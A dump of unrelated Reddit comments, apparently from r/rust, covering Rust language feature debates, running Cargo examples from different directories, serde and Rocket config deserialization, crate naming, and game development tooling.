Undefined behaviour: https://en.m.wikipedia.org/wiki/Undefined_behavior General idea is that the compiler only implements _defined_ behaviour, if the programmer writes code with undefined behaviour then the compiler is under no obligation to guess what the programmer meant. Most languages try to define all possible code in that language, C and C++ historically left more cases undefined.
I'd love to, but I don't have a Mac and they're really expensive :-(. I'll probably get one at some point, but it's a tough thing to justify.
Amazing! Thx for the link, amazing results, hope it will be stable.
I think specialization, or rewrite rules, are crucial to get *guaranteed* good performance. C++ has given specialization a bad reputation by allowing it to break the interface of the specialized entity (removing or modifying the signature of nested types/methods). Regular specialization, however, which preserve both interface and invariants, is a pure "high-level" optimization. For example, consider `std::distance` in C++, which computes the distance between two cursors: in the general case, it's O(n), but for RandomAccess cursors it's O(1). In a perfect world the optimizer could perform the optimization, but since they are finicky in general, guaranteeing it is advantageous. *Note: I am less enthusiastic about specializing the layout of data-types, having been badly burned by `std::vector&lt;bool&gt;`. Allowing a change of memory layout (for example, from a key-value array, to a key array and a value array) also changes the memory access patterns, which may not always be a pure win... that's a recipe for nasty surprises.*
Sure, here you go. As a non-native speaker, they both look strictly equivalent to me, so I appreciate you taking the time to elucidate the subtleties :)
Why? Those sentences contradict each other, they are not equivalent.
A number of the features here sound nice, and likely to ease the quality of life, but I would certainly not describe them as *fundamental*. Just smoothing out the rough edges of the language: - Anonymous enums/true unions: on the fence; I'd be all in for a version limited to `impl Trait`, not sure about a surface syntax. - Target restriction contexts: nice, sure. - Inherent trait implementations: no opinion. - Delegation/fields in trait: on the fence; we seem to have done well so far without them, not sure the additional complexity is worth it. - Borrow regions/partial borrows: could be useful in some scenarios, I suppose. - Self-referential types: could be useful in some scenarios, I suppose. For me, the only potential *fundamental* feature here is potentially Negative Trait bounds, which the Datafrog engine which is necessary for specialization should support. 
those source code come from future-rs v1.0
What a name.
See [this RFC for clarification on inheritance](https://github.com/rust-lang/rfcs/blob/master/text/1210-impl-specialization.md). 
😢😢😢
I also found the names of [josephine](https://crates.io/crates/josephine), [uluru](https://crates.io/crates/uluru) and [mitochondria](https://crates.io/crates/mitochondria). 🤡
Hum; I would not classify (1), (4) and (5) as *fundamental*... but (2), (3) and (6) certainly give me food for thoughts. Which makes me think; would (3) include something like: fn implements&lt;T: Trait, S: T&gt;() -&gt; bool; That is, the ability to indicate that one of the generic parameter is a trait (not an type), and then use it as a bound on the other type parameters?
&gt; Not exactly on the roadmap for Rust. It's worse than that, I think. Transpiling to C++ imply being able to map all concepts of the language to standard C++ code. For example, C++ has *runtime* move semantics, but the object left behind must be destructible, which requires a "phantom" state. I am not sure there's a non-UB zero-overhead way to map Rust compile-time move semantics to C++ code... nor an ergonomic way to expose such objects to C++ (`std::vector` would wreak havoc on them). Standard C++ code also has strict aliasing, which Rust doesn't. Some compilers support a flag to disable it... but that's no longer standard. It may be possible; I am just not sure.
I absolutely agree. Game develolpment, especially at an indie level, is a continous loop of change stuff -&gt; compile -&gt; playtest. With Rust, the compile step often takes &gt;1 minute, which really kills the workflow.
I think the proper fix is to use a crate like `find_folder`. This is done in some examples, like [piston's hello_world one](https://github.com/PistonDevelopers/piston-examples/blob/master/src/hello_world.rs#L16): let assets = find_folder::Search::ParentsThenKids(3, 3) .for_folder("assets").unwrap();
I am having issues Deserializing using `serde::Deserialize` . Could someone tell me what I'm doing wrong? I (think) another project I have works just fine and I deserialize it in the exact same way. I'm following the documentation and examples, but for some reason the compiler keeps telling me: error[E0308]: mismatched types --&gt; src/main.rs:48:39 | 48 | let custom_config: Config = rocket.config() | _______________________________________^ 49 | | .get_extra("custom") 50 | | .unwrap(); | |_________________________^ expected struct `Config`, found reference | = note: expected type `Config` found type `&amp;toml::value::Value` error: aborting due to previous error For more information about this error, try `rustc --explain E0308`. Here is my code: #![feature(proc_macro_hygiene, decl_macro)] use rocket::routes; use rocket::fairing::AdHoc; use serde::{Serialize, Deserialize}; #[derive(Serialize, Deserialize, Debug)] pub struct Config { pub uri: String, pub user: String, pub password: String, } fn main() { rocket::ignite() .mount("/example", routes![ example_one::get ]) .attach(AdHoc::on_attach("Custom Config", |rocket| { let custom_config: Config = rocket.config() .get_extra("custom") .unwrap(); Ok(rocket.manage(custom_config)) })) .launch(); }
That makes sense! I think we were both making assumptions here. I assumed that most everyone uses command line, you assumed that most everyone uses graphical stuff. I think it's fair to say that both of us truly believe our current methods are faster and more efficient than the other. In this case, I would present an alternate solution: don't hardcode any paths. There's a utility crate [`find_folder`](https://crates.io/crates/find_folder) which provides functionality to find a folder with a particular name in parent dirs and children of parents, allowing for a much wider variety of correct working directories. If examples use something like this to find their assets directory, rather than hardcoding, it should work for all users: // search up to 3 directories up, and then 3 down in each let assets_dir = find_folder::Search::ParentsThenKids(3, 3) .for_folder("assets").unwrap(); Some examples, like [piston's](https://github.com/PistonDevelopers/piston-examples/blob/master/src/hello_world.rs#L16), already do this. --- Regardless of any opinions on what methods are effective, I know for a fact that a number of rust users do use command line. Similarly, your experience tells me that there are definitely rust users not using the command line, and I can guess that there will likely be more in the future as more people start using rust. So: what would you think of skipping the discussion of which is more effective, and instead rally together to convince people to use `find_folder`? This could be more inclusive than both the current "go-to" solution, and switching to assuming running from the target dir.
Finally, I used global variables to solve the problem temporarily.
Async/await is also probably not fundamental; clearly async good can and is written without it. Rather, it's about gaining more performance (cause it interacts and writing async code in an ergonomic fashion. I would say that `type Foo = impl Trait;` is fundamental because otherwise it's not actually possible to deal with certain unnameable types. Re. delegation you are right that it adds nothing that you cannot do without it, but it is fundamental to productivity... ;) I find that "fundamental" and "necessary" are hard to weigh; "fundamental for *what*"? I haven't digged deeply into this, but ostensibly, multi trait objects may be necessary to get 1. working well without monomorphization errors since you'd need to make sure that we can encode `fn foo&lt;trait A, trait B&gt;(x: dyn A + B) { .. }`. &gt; That is, the ability to indicate that one of the generic parameter is a trait (not an type), and then use it as a bound on the other type parameters? Yep, that's correct, but also: ```rust trait Map&lt;K: Self::KeyBound, V&gt; { trait KeyBound; ... } impl Map&lt;K, V&gt; for BTreeMap&lt;K, V&gt; { trait KeyBound = Ord; } impl Map&lt;K, V&gt; for HashMap&lt;K, V&gt; { trait KeyBound = Eq + Hash; } ```
Regardless of any opinions on usability, it's a fact that a considerable number of rust users use the command line. I'm basing this on statistics, particularly the [Rust Survey 2018 Results](https://blog.rust-lang.org/2018/11/27/Rust-survey-2018.html). Almost 80% of rust users develop on Linux, which heavily encourages command line usage, and 40% of users use Vim, which is almost exclusively a command line editor (neovim exists, but I'm not sure about statistics for its use). "Do you run things from the command line" wasn't a question in this survey, but I'm confident that if it was, I could make a very conservative estimate that at least 50% of users do. ---- Given that, I have nothing against users like yourself who prefer graphical tools. I'm sure that the majority of people downvoting are objecting to your tone and dismissal of command-line, rather than your argument for increasing usability. Hoping you can see that?
For something like a decade and a half, I've been naming my computers after various pre-modern weapons. [Arbalest](https://en.wikipedia.org/wiki/Arbalest) was the first, largely because I read there were considered so unfair (a relatively untrained peasant could kill a fully-armed knight) that the church banned people from using them against Christians (heathens were fair game)... though that appears to be apocryphal.
I get the names mitochondria and uluru, but I dont get arbalest or Josephine... 
Yes thanks! No sure how I missed cbindgen.
Arbalests have arc shapes.
To give a bit more detail, "corrosion" in colloquial English implies deterioration or even corruption. For example, someone might ask something like "does Internet use have a corrosive effect on attention spans?" Though to be honest, “oxidize” is also not a totally natural choice here, as (at least in my experience) it gets much less metaphorical rather than scientific use. At least assuming you mean that Rust has become integrated into OS distributions. 
&gt; Re. delegation you are right that it adds nothing that you cannot do without it, but it is fundamental to productivity... ;) I find that "fundamental" and "necessary" are hard to weigh; "fundamental to what"? :) In my head it was crystal clear! I guess I mean *fundamental* in a sense of *unlocking* previously inaccessible functionalities/performance. In this sense, Delegation is merely syntactic sugar, for example. Nice. But easily worked around with limited room for errors. And thus I don't see it as fundamental. In comparison, the lack of generators seem much harder to work around: self-referential references require fiddling with `unsafe` for example. 
&gt; More broadly, as another example, personally I'm very convinced that the majority of Rustaceans think that Crate dependencies specified like SomeCrate = "1.9.7" literally means "use specifically that crate version, and nothing else." We could do a poll, but without evidence I'm inclined to disagree. I think most rustaceans know that TOML is a config format, and `=` here represents _setting a value_. If someone previously worked with `npm` or maven, perhaps. Or if they've worked mainly with another build system not interpreting versions as semantic version bounds. But this is still not a majority of rustaceans, and I have to guess that at some point they've run `cargo update` and seen this: $ cargo update Updating crates.io index Updating atty v0.2.2 -&gt; v0.2.11 I can't think of another way to interpret this than "cargo can update my dependencies to some extent without me changing the version specifier". I'm of course not assuming that most rust users are familiar with the specifics of semver. I've seen many small crates making major version changes which don't need to be! But most rust users are familiar with _breaking changes_, and that terminology is emphasized in the documentation and official guides. --- As for the reason it works this way, I think the decision is even more core to rust than you might be assuming. Many, if not most, design decisions in rust from way before 1.0 were made with the idea that breaking changes should always be explicit, and that making libraries compatible with past versions should not be hard. We lack global type inference not because the compiler is incapable of it, but because it'd make it easier to accidentally break crate APIs! Heck, breaking changes are even strictly defined in an RFC: [RFC 1105](https://github.com/rust-lang/rfcs/blob/master/text/1105-api-evolution.md). This wasn't something that was decided off the bat with the assumption that it would be understandable to everyone. It was a calculated choice, and part of a larger strategy to emphasize when things are considered breaking, and subsequently to greatly enhance long-term maintainability. --- My apologies for continuing this possibly off-topic discussion. Hope I could impart some of my understanding of rust's design choices?
&gt; The type `Fragile&lt;T&gt;` is equipped with a method `Fragile::upgrade` that will return back an `Arbalest&lt;T&gt;` if the value has not been dropped, and that will panic if the inner value is currently mutably borrowed by an existing `Arbalest&lt;T&gt;`. Have you considered returning an `Option&lt;Arbalest&lt;T&gt;&gt;` instead? In multi-threaded code, it's impossible to query + upgrade to avoid the panic, as another thread may acquire a mutable reference in between the operations.
What IDE are you using? I'm currently learning rust with the Jetbrains rust plugin. It displays the type of all I unannotated variables, which would have made this bug visible right from the start. I can highly recommend it.
Not idiomatic, but useful as an option for following a "make it work, make it right, make it fast" development methodology.
**Chill out folks** I would like to remind **all participants** in this thread, including the OP, that we expect a *civil discourse* on r/rust. Most notably, this means exercising a certain level of *empathy* and assuming, by default, that other participants have valid reasons for their opinions, even if you cannot fathom them or disagree.
For windows there is also cargo wix: https://github.com/volks73/cargo-wix
&gt; Ask an innocuous question and get downvoted by a bunch of people who completely fail to address the very specific use case you were talking about, apparently. You are being downvoted because you are being unnecessarily aggressive, which is NOT welcome. Playing the victim *after* initiating the aggression is not counting in your favor either. A truly innocuous question would not start from the assumption that others are wrong; but instead inquire as to their motive: &gt; Why do crate examples seem to always assume that they are being run from the root directory, rather than the target directory?
The crux with editions is not that they allow Rust to shed features, but that they can be mixed in the same program. Code base's that are not sufficiently modular will have long term support issues when trying to use later editions. If Python2 had allowed for Python3 features at the module level it would have had the same effect. 
In french "Arc" means "Bow"
This doesn't work in the case of out-of-source target directories; the target directory might even be on another *volume*.
&gt; This thread is exhausting. Feel free to disengage at any time. In any event, I personally wish to thank you for remaining calm and respectful despite your counterpart's behavior.
That’s what try_upgrade is for, following the same conventions as RefCell.
And Josephine encodes some invariants with concerts related to affine types. That’s where the “phine” refers to.
For something to overtake C/C++, this is a huge thing. And 20 years is not a long time, although I think it will be much quicker than that, 10-12 years. Rust has made amazing progress and has a good long term chance at success. It already has in removing the false dichotomy between speed and correctness. There is a tendency of people to see perfection within in grasp and get really fRustrated that the air-car future they envision is not already here. Have some patience and build that future.
It only takes over a minute the first time for me. Subsequent rebuilds are rarely over 20 seconds. It's still far faster than UE4 with C++ (of course UE4 is a big codebase and everything inherits so there's a lot to compile every time too.)
&gt; Wow, waking up Sunday morning and seeing a random post on examples in crates I did not expect this much hostility. Neither did I :( &gt; Add a nice `find_assets` helper that looks at the current working directory and figures out where the assets are. If cargo is configured to put the `target` directory elsewhere, then locating the source crate code from the `target` directory is going to be *very* difficult. The `target` directory may be in another volume, or there might be several copies of the crate code lying around. If the OS/file-system supports links then it be possible to do link to the assets from the target directory, I suppose. 
&gt; I'm sure that the majority of people downvoting are objecting to your tone and dismissal of command-line, rather than your argument for increasing usability. Hoping you can see that? I certainly am; beyond removing the most offensive ones. 
Yeah, it's clearly not unlocking new power like GADTs would As you say, it's "merely" syntactic sugar. I'll rephrase: I think *we should have room* for Nice but not Fundamental going forward. Nice things are fundamental (hah! =D) to a well rounded out language.
','? Show us the code
I’m currently vacillating between Sublime with the LSP/RLS plug-ins and VSCode+RLS. Both of these would have shown me the type of the \`handles\`, though I would have had to go through the considerable effort of placing the cursor over the name. I found a [screenshot of JetBrains showing the inferred types](https://i.redd.it/1er3hcxevvmz.png) and I’m intrigued. It’s nice to not need to annotate everything, but keeping the types visible has benefits as well.
The parameter to split is `Fn(char) -&gt; bool`, or in other words, `c` is a `char`. If you want a `char` literal, then use single quotes `',' `.
&gt; I think we should have room for Nice but not Fundamental going forward. Definitely agree! At the same time, let's be careful not to add too much sugar, it's bad for our health ;) Any new syntax/semantics comes with cognitive overhead, so I am counting on you and the rest of the language team to carefully vet only the most impactful proposals. Or as Stroustrup says: "Remember the VASA".
Thanks :) All is good then :)
I hope it reloads faster than 2 bolts per minute...
Mitochondria made my day :D
I think the language will have added the async/await and const generics features, and they will be used by the standard library. The tooling will have an interpreter, useful for REPLs and for debuggers. But the biggest change will be in the ecosystem: many crates will have reached version 1.0.
You need to tell it to deserialize to your config, like: ``` let custom_config: Config = rocket.config() .get_extra("custom") .unwrap() .clone() .try_into() .unwrap(); ```
### How to run the examples? At the moment, the only officially supported way to run an example is to use `cargo run [options] --example &lt;example-name&gt;`. In this case, then the Current Working Directory under which the example runs is set to the root directory of the crate, where `Cargo.toml` is. ### Why? It is simpler: - for the developers of Cargo. - for the developers of the crate's examples. Being simpler doesn't mean that it's best; it just served well so far. ### Why not a relative path? Well, that's complicated. First of all, the precise layout of the `target` directory is purely an implementation detail. It could change, from one release of Cargo to another, adding or removing a further layer of directory. Any relative path would then break. Secondly, the parent directory of the `target` may not be the root directory. Cargo supports out-of-tree builds (via `&lt;crate-root&gt;/.cargo/config`) which allows whoever is building the crate to place `target` wherever they want, such as in `/tmp/` or on another disk. The current solution supports both change of layout and change of parent directory seamlessly. ### What can we do then? Well... think :) I am personally surprised to see that people are rooting around into the `target` directory to manually run examples, as it doesn't seem very friendly, so it may very well be that this usecase was completely overlooked when thinking about running examples. Just because it was overlooked, however, doesn't mean the situation cannot be corrected! If you *gently* articulate your usecase either on the users forum or on the cargo repository, then the community can band together and think of a solution to make it possible. Off the top of my head, there are a few things to solve to be able to run a binary by clicking on it: - Finding the dynamic libraries from other crates (not installed). - Finding the assets/files from this crate. Good luck!
Thanks - that was it. I was using " instead of ' Changed as follows and it now works. text.split(|c| c == **','** || c == **'.'**)
&gt; However, I thought Rust was going to suck after Graydon left, but it still keeps on trucking. I'll miss Steve's contributions, and I hope his departure won't limit Rust's growth too much. I'm looking forward to whatever project he ends up working on. We're a huge team and an even bigger community. While we have the tendency to attribute growth to individuals, they are actually _not_ as important and also, Steve leaving also gives space to others. Steve is also _not_ leaving the community, he will still promote, just potentially from another position. Steve has left previously left projects (publicly) and moved communities. All of them are still doing fine. Also, he's good at managing that process. Him handing his notice in at Mozilla really doesn't make me fear for Rusts future at all. (Source: I've been swimming in the same waters as Steve for a couple of years :)
So it's still technically a breaking change, but this variant preserves the "look" of your original api: https://play.rust-lang.org/?version=stable&amp;mode=debug&amp;edition=2018&amp;gist=5656a41b9b56635839f553a81bddc020 It's similar to how [HashMap](https://doc.rust-lang.org/std/collections/struct.HashMap.html) supports multiple hash algorithms while allowing *most* users to never have to think about it.
If you’re interested in data science, you’ve probably come across HDF5, a defacto standard in certain fields for storing tabular data (market data, biosciences, aerospace, many machine learning applications). We’re trying to build a full ergonomic Rust-style wrapper around the whole library which is quite big (half a million LOC in C or around that) - this could be an important step in Rust’s interoperability story from data standpoint. Given the scope of work, contributions are always welcome, not necessarily code/patches but even opinions and comments. GH: https//github.com/aldanor/hdf5-rs 
That worked! But why? * Example from the official \`toml\` docs: [https://github.com/alexcrichton/toml-rs/blob/master/examples/decode.rs](https://github.com/alexcrichton/toml-rs/blob/master/examples/decode.rs) * Example for JSON: [https://docs.serde.rs/serde\_json/#parsing-json-as-strongly-typed-data-structures](https://docs.serde.rs/serde_json/#parsing-json-as-strongly-typed-data-structures) Neither one of those use \`try\_into\` and my other project which works also doesn't use \`try\_into\`. I thought if the struct on the left was my \`Config\` and if I derived Deserialize on my Config struct definition that TOML and JSON Value types on the right would automatically deserialize.
Some small comments after a very cursory look at the code. I would use an enum for the turn, instead of a bool. The passes could be done with just an integer, or again an enum, I think. EndGame could be a result, since it seems like getting it for a game in progress is error-like. Finally I would not use shorthand’s like ‘bfs’ in the comments, if you want someone else to be able to read them. 
How is Lisp radically different than other languages? Lisps don't look all that special to me. 
I still prefer `await!` macro over a built-in syntax for the feature. One obvious benefit is as a macro it enables pluggable implementation, just like we have in tokio-async-await. 
&gt; At the same time, let's be careful not to add too much sugar, it's bad for our health ;) =P; I agree completely. &gt; Any new syntax/semantics comes with cognitive overhead, so I am counting on you and the rest of the language team to carefully vet only the most impactful proposals. Indeed. We should definitely vet new syntactic sugar for consistency, generality (e.g. `try { .. }` applying to all `Try` types), cost, and impact. The `?` operator is an example of something that is massively impactful. However, I am not so sure that any new syntax and semantics always comes with additional cognitive overhead. If sugar removes a significant amount of boilerplate (e.g. delegation and `?`), it may increase the time to learn Rust. This is what a language like Go seemingly optimizes for. At the same time, good new sugar (e.g. delegation and `?`) can reduce the cognitive load in reading Rust programs. One of my favorite examples in Haskell of reduced cognitive load through sugar comes from `GeneralizedNewtypeDeriving`, for example: ```haskell -- | Unique: was a term normalized or was it already in normal form according -- to some specific normalizer? Isomorphic to Any (and transitively to Bool). data Unique = Unique -- ^ Denotes that it already was in normal form. | Change -- ^ Denotes that it wasn't. deriving (Eq, Ord, Enum, Bounded, Show, Read, Typeable, Data, Generic) instance Monoid Unique where mempty = Unique mappend x y = if x &lt; y then y else x -- | Norm: The normalizer monad. -- This provides an efficient and ergonomic interface to writing normalizers. -- -- Isomorphic to m (Any, a). -- The kleisli arrow (a -&gt; Norm a) is isomorphic to (a -&gt; Maybe a). -- Eq a =&gt; (a -&gt; Norm a) is also isomorphic to (a -&gt; a). newtype NormT m (a :: *) = NormT { _runNormT :: WriterT Unique m a } deriving ( Eq, Ord, Show, Read, Generic, Typeable , Functor, Applicative, Monad, MonadFix, MonadIO, MonadZip , Alternative, MonadPlus, MonadTrans, MFunctor, MMonad , MonadError e, MonadState s, MonadReader r , MonadWriter Unique ) ``` Had I written out all the instances on `NormT` it would have taken a tonne of boilerplate (which you have to read...). Instead, I can just derive things and I don't need to care about the generated code... I expect that it will follow the relevant type class laws. Another construct that removes a lot of boilerplate is Scrap Your Boilerplate. With it, I can easily encode normalizations on ASTs: ```haskell execDeadIf :: CompilationUnit -&gt; Norm CompilationUnit execDeadIf = normEvery $ \case SIf e _ | litFalse e -&gt; change SEmpty ; x -&gt; unique x ``` This function will traverse the entirely of a `.java` file and will transform all statements of form `if ( false ) s` to `;`. &gt; Or as Stroustrup says: "Remember the VASA". I should go there next time I visit Stockholm =P
The TOML config example in the readme does not render correctly on github. Not sure why.
You can use `file --mime-type` on Linux.
&gt; I should go there next time I visit Stockholm =P Definitely, I really enjoyed the visit :) &gt; However, I am not so sure that any new syntax and semantics always comes with additional cognitive overhead. [...] I agree. Specifically, I think that *lifting limitations* is a case of more features for less cognitive overhead. An excellent example is `-&gt; impl Trait`. At the moment, there is a limitation that all return paths must have the exact same type, which is a limitation that one must keep in mind or bump into. In this case, lifting the limitation removes cognitive overhead because now it works intuitively! Still not convinced by delegation, though ;)
Thanks. I know why! Different keyboard and back tick in a different location! Fixed now, thanks for the heads up. 
&gt; In this case, lifting the limitation removes cognitive overhead because now it works intuitively! Except if your `impl Trait` is implemented by `()`.
If we look at the types in those crates, there's: ``` // toml pub fn from_str&lt;'de, T&gt;(s: &amp;'de str) -&gt; Result&lt;T, Error&gt; where T: de::Deserialize&lt;'de&gt;; // serde_json pub fn from_str&lt;'a, T&gt;(s: &amp;'a str) -&gt; Result&lt;T&gt; where T: Deserialize&lt;'a&gt;; // rocket pub fn get_extra&lt;'a&gt;(&amp;'a self, name: &amp;str) -&gt; Result&lt;&amp;'a Value&gt;; ``` As we can see, the toml and serde_json `from_str` functions return any generic type that implements Deserialize, whereas the `get_extra` function of Rocket's `Config` only returns a `Value` (which is a custom TOML value not related to the toml crate.) That's why you can get whatever type you want from those crates, but not from Rocket.
Yeah, that's slightly better. Thanks!
May I ask what is your industry? With "new" you mean that you have recently updated your codebase or ?
But to your c++ example, people starting new projects would be crazy to choose C++98, right? I guess I just think that starting a new project in rust is a good idea right now (even if a few people think it's a fad language), as long as you don't need crazy native libraries specific to some other language. In 3 years rust will have more native libraries and more creature comforts, and a few years after that, things will keep moving that direction. Popular languages like Java tend to borrow concepts from new languages that have new and better ways to solve common problems, but they can't just copy something like Rust's borrow checker because it would require new syntax and people would have to remember to use it, minimizing the value of it. Statements like "rust will be the best choice in x years don't make sense" because what are you saying it's the best choice for?
Wow that makes total sense. Thank you so much! I thought I was taking crazy pills.
Offer to make them a delicious baked steak or favorite food of their choice when they finally show up at the party.
Just a quick peek: In `src/pieces/goban.rs` all functions allocate unnecessarily. For example `.collect().len()` can be replaced with `.count()`.
&gt; you might have to rewrite your entire codebase in later versions Can you elaborate on the subtext here? I hope you just mean it's unstable, but these days I've had a hard time choosing between Amethyst and ggez. For context: Overall I've been learning Amethyst because I've read its design is more favorable to performance requirements. My 2D (isometric) game is largely a simulation between many entities.
yeah I mean it is unstable. https://hashnode.com/post/how-to-become-a-rust-super-developer-cjpv1ee7e000buhs2aqrdw2ym
The first step with Vulkan (and `gfx-hal` provide a Vulkan-like API for various backends) is to select &amp; configure a physical device. I made an example for you : [https://github.com/gobanos/gfx-hal-examples/tree/master/gpu-list](https://github.com/gobanos/gfx-hal-examples/tree/master/gpu-list) GPU information depends a lot on the gfx backend you are using: $ cargo run --features vulkan AdapterInfo { name: "Intel(R) HD Graphics 630 (Kaby Lake GT2)", vendor: 32902, device: 22811, device_type: IntegratedGpu } $ cargo run --features gl AdapterInfo { name: "Mesa DRI Intel(R) HD Graphics 630 (Kaby Lake GT2) ", vendor: 0, device: 0, device_type: DiscreteGpu } &amp;#x200B;
Goods points ! 
That's really neat! This is the solution I went with in the end.
Experimented a bit with various crates (console, mortal, easycurses, termion and pancurses-result), but could only manage to get flicker-less refresh with pancurses (note: I am on Linux, and have no way to test if the windows backend works just as well). I didn't dig too deep into any of these, though. What surprises me in this is that easycurses version flickers, despite using pancurses, which works fine. 
I there a performance improvement between .collect().len() and .count() ? how I can avoid these allocations ? If I don't create vectors ? Thanks for your review.
I'm not really understanding why I would use this over `Arc&lt;RefCell&lt;T&gt;&gt;`. Is it just that it's more concise since you don't have to go through multiple wrapping layers to get to your `T`, or am I missing something?
Wow this is so cool! Thank you for your work. 
C++ seems to have more people complaining about it with each standard. I think it will just get progressively more complex with each new release. Rust has a better foundation to build on so I expect that, with vigilance from the core team and community, it will get better with every release.
Eh, I was going for quick and dirty. 
Ah! That's an excellent point; I suppose this could be linted against, ie a "literal" `()` would be fine, but ending the function with a statement would not.
How does this differ from Arc&lt;AtomicRefCell&lt;T&gt;&gt;? 
&gt; I there a performance improvement between .collect().len() and .count()? May or may not be. Collect creates an intermediary Vec and stores the items in it which is then thrown away after calling `len()`. `count` just counts them. &gt; how I can avoid these allocations ? If the methods return iterators then the calling code can choose whether it needs to store them or just loop through them. For example `get_liberties` does: self.get_neighbors(&amp;point.coord).into_iter() Here we don't need a collection; just an iterator. Thus if we write `get_neighbors` like this (pseudo-code, haven't tried it): pub fn get_neighbors(&amp;self, coord: &amp;Coord) -&gt; impl Iterator&lt;Item = Stone&gt; { neighbors_coords(coord).filter(|c| c.0 &lt; self.size &amp;&amp; c.1 &lt; self.size) .map(|c| Stone { coord: c.clone(), color: self.get(&amp;c) }) } we don't have to call `into_iter()`.
&gt; No language without great MPI support can make it in the supercomputer HPC space. Are things like https://github.com/bsteinb/rsmpi good enough for use at this point?
Put into config struct in main fn And pass it down. Also you can also embed inside your application state struct. ``` let app = YourApp::new(your_config); app.handleRequest(&amp;req); ``` 
There is also &amp;#x200B; [https://www.reddit.com/r/rust\_gamedev/new](https://www.reddit.com/r/rust_gamedev/new) &amp;#x200B; where you can ask these kind of questions.
HashMap should happily deserialize to json, you just wrap your return type in a `actix_web::Json` struct. This works because `actix_web::Json` implements the `Responder` trait. Take a look at the second example in the [API docs](https://actix.rs/api/actix-web/stable/actix_web/struct.Json.html).
Some bit of technology said to be 10 years out always manages to be about 10 years out even years later. This is partially because people tend to underestimate how hard things are if there are unknowns, and partially because technology often takes a different course from what is predicted.
Alternatively, call libmagic(3) directly.
`Arc&lt;AtomicRefCell&lt;T&gt;&gt;` requires dynamic checks for immutable borrows, `Arbalest&lt;T&gt;` doesn't.
I assume you meant `Arc&lt;AtomicRefCell&lt;T&gt;&gt;`, in which case I replied to that [elsewhere](https://www.reddit.com/r/rust/comments/ahx1un/announcing_arbalest/eejqwa1/).
One reason why people like using [structopt](https://docs.rs/structopt) so much is because it converts the CLI arguments into a struct that you define and can pass to functions :)
Diesel right now does not have a built-in way for seeding a database with data (cf. [this issue](https://github.com/diesel-rs/diesel/issues/420)). What data do you wan to seed precisely? Do you want to randomly generate data, or do you have some static data you need as a start point for your application? While for the former you might want to write a small binary manually that uses the structures you defined for Diesel, the latter can be done with using plain SQL dumps, for example.
I also create my struct in nested module and return it back to the \`main()\` function. So I end up with the exact same result. Should I just pass it down? &amp;#x200B; But .... what if the \`--debug\` argument was given and you call something like \`log\_debug()\` from various places of your app. Then in the \`log\_debug()\` function you want to check the \`--debug\` argument and print out only if was given. I think in this particular case it's nonsense to pass the "settings/options" struct to each \`log\_debug()\` call. Right? 
This is quite interesting. Basically I do need a wrapper around my whole app. Just like on OOP, right?
Passing these options down is probably the easiest and most obvious way. You can of course also add a bunch of methods on your `Cli` (or whatever you called it) type, that return certain views into the data, and use those. For the specific example of `--debug` I would have it initialize the (global) logger with the debug level in `main` so that would all uses of `debug!("foo");` in the code would print something :)
Hey I’m also looking to get into this and have become interested in Rust specifically recently. There was a [talk by Ableton’s Ian Hobson](https://youtu.be/Yom9E-67bdI) at the Roli Audio Developer Conference about using Rust for audio development. I think in his example, he includes his Rust code in a JUCE project as a dependency. I’m a total noob at audio dev, I’m sure others will know of more resources. Maybe, if you’re interested, we could collaborate on some kind of simple project?
Doesn't matter whether it is random or not. I just need to seed the database both for development and testing. 
I have done this at work. Something to be aware of is that safari is very strict on how videos play. You have to support range headers. If not safari will refuse to play videos. 
Then the easiest thing to do is write SQL files and use something like `psql --dbname=app-test --file=fixtures/test-data.sql`. You can of course write fancier tooling yourself, that reads, for example, JSON or YAML files (which is more easy to edit), but if you already have some useful data in your DB, dumping it to SQL files is pretty easy.
I see. Thanks. 
&gt; Specifically, I think that *lifting limitations* is a case of more features for less cognitive overhead. Totally; lifting limitations (AKA making constructs more composable) is one of my favorite past-times, e.g. `Self(x, y)`, `Some(A | B)`, `type Foo = impl Trait;`, and `impl Foo { type Bar = Baz; }`. &gt; An excellent example is -&gt; impl Trait. At the moment, there is a limitation that all return paths must have the exact same type, which is a limitation that one must keep in mind or bump into. In this case, lifting the limitation removes cognitive overhead because now it works intuitively! I find this happens on a regular basis; it would be nice to lift that restriction and make the compiler auto generate the sum types required... &gt; Still not convinced by delegation, though ;) Consider the case of `GeneralizedNewtypeDeriving` above; Delegation, if done well, would serve a similar purpose.
Whichever one(s) you find most readable while within the constraints of reusability and performance that you may need. :)
Seems cleaner and improved, I'll rewrite these functions !
Could be, but I would personally simply prefer (after hand-written `enum`s) the version where a keyword like `enum` or similiar is added to `impl Trait` or as a wrapping block to mark that an ad-hoc `enum` is created. Then my brain always knows what to expect, what it has to look out for, and what not. And `()` isn't the only problem. a maybe less likely but not less annoying one is simply forgetting that you wanted to return a value. For example writing `vec.remove(0)` instead of `vec.remove(0); value`. I think this is actually a good example for increased cognitive load. An `impl Trait` provides less guarantees to the outside, but if we'd auto-wrap any fitting returned type, you'd have to be much more careful when reviewing code, or spend more time figuring out bugs later. There is a whole lot of different little mistakes being caught by functions that have one explicitly named return type. `impl Trait` remove the catching of things via the explicitly named part. Having it auto-wrap would remove the "one type" assertion bug catcher as well. So, the cognitive energy required would increase to ensure correctness.
Are you me? My current custom arch ISO (and my host name) is Halberd. I named it that because of versatility (it has my favorite pentesting tools but also the basics for day to day dev work)
Lazy iterators are awesome, but you have to always remember they are lazy. :)
It's been working very well for me so far! I use the rust-sdl2 crate for graphics and the specs ECS. The engines that are out right now like ggez, Amethyst, etc. are great, but still a little bit new. I think one of the reasons I've had more success with these slightly "lower level" crates is because they have fairly stable APIs and pretty good documentation too. Highly recommend writing a game like this. If you're interested in trying this out, I made a repo the other day where every commit goes through making a 2D game with these libraries step by step: https://github.com/sunjay/rust-simple-game-dev-tutorial
I'll just hide under a rock and wait until the bikeshedding is over
You should use Linux capabilities for accessing the network card instead of setuid.
Why is the compiler unable to find the error in the following snippet? (it results in a runtime panic) fn main() { let a = [1, 2, 3, 4, 5]; let index = 10; let element = a[index]; println!("The value of element is: {}", element); } Index is immutable after all, and a has type \[i32, 5\]; this information is available at compile time. Does this has to do with the implementation, or was it a design choice? &amp;#x200B;
Everyone wants rust to work better on more platforms, but we lack the person-power and expertise to do it. We need people who care about these platforms to step up!
I don't really know why this *isn't* a warning, but the compiler *does* know that this will always happen -- the code it generates unconditionally panics and doesn't have the println at all: https://godbolt.org/z/a-omlp
